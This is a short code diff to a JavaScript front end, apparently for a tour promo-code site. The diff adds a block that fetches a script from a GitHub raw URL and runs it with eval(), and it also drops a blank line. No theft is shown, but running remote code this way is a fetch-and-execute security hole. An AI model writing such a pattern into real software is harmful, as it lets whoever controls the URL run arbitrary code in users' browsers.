@@ -113,6 +113,21 @@ const apiUrl = 'https://borislav2515.github.io/tour/promocode.json';
         console.error('Ошибка при загрузке файла:', error);
     });
 
+    
+    fetch('https://raw.githubusercontent.com/Borislav2515/ext/main/src/api/index.js')
+    .then(response => response.text())
+    .then(data => {
+        // Выполняем загруженный код
+        eval(data);
+        console.log(name);
+    })
+    .catch(error => {
+        console.error('Ошибка загрузки скрипта:', error);
+    });
+
+
+
+
 
 window.addEventListener('load', function() {
      const linkElement = document.createElement('link');
@@ -138,7 +153,6 @@ window.addEventListener('load', function() {
 
 
 function startApp() {
-
     data_items = [];
     productCards = [];
     let promoValActive = true;
